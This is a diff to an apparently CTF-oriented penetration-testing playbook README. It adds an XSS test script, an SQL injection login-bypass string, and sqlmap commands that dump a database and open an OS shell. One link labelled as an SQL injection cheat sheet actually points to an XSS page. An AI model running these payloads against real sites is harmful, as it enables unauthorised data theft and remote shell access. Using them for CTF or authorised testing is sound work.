@@ -31,6 +31,7 @@ Previous Play Icon:
   - [Web Application Attack](#web-application-attack)
     - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
     - [SQL Injection](#sql-injection)
+    - [XPath Injection](#xpath-injection)
     - [Local File Exclusion](#local-file-exclusion)
     - [Remote File Inclusion](#remote-file-inclusion)
   - [Port 20 FTP](#port-20-ftp)
@@ -53,7 +54,7 @@ Previous Play Icon:
   - [Set up a Webserver to Share files,exploits](#set-up-a-webserver-to-share-filesexploits)
   - [Upload Maliscous File](#upload-maliscous-file)
 - [Exploitation](#exploitation)
-  - [Reconnaissance](#reconnaissance)
+  - [Reconnaissance 4](#reconnaissance-4)
 - [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
 - [Priviledge Escalation](#priviledge-escalation)
   - [Kicking the Tires](#kicking-the-tires)
@@ -181,12 +182,27 @@ Digging deeper into particular services, and running massive vulnerability scans
 ## Web Application Attack  
 ### Cross Site Scripting (XSS)
 ```bash
+# Enter this into a web form to check for XSS vuln
 <script>alert("XSS")</script>
 ```  
-### SQL Injection  
+### SQL Injection    
+[OWASP SQL Injection Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
+[Bug Bounty XSS CheatSheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
 ```bash
+# Enter to a login page to check for SQL inj
+username: ' or '1' = '1'
+password: ' or '1' = '1' 
+
+# run sql map on an injectable site 
+sqlmap -u "domain" --dump
+# use sqlmap to gain a remote shell
+sqlmap -u "domain" --os-shell
 
 ```  
+### XPath Injection  
+```bash
+
+```
 ### Local File Exclusion  
 ```bash
 
@@ -425,7 +441,7 @@ target$ wget [attack-machine-ip]/filename.extension
 Successful gain unauthorized access
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4).  This step depends entirely on what type of exploit you decide to use. 
 
-## Reconnaissance   
+## Reconnaissance 4  
 Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#command-and-gittroll-(cg2)) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)
 
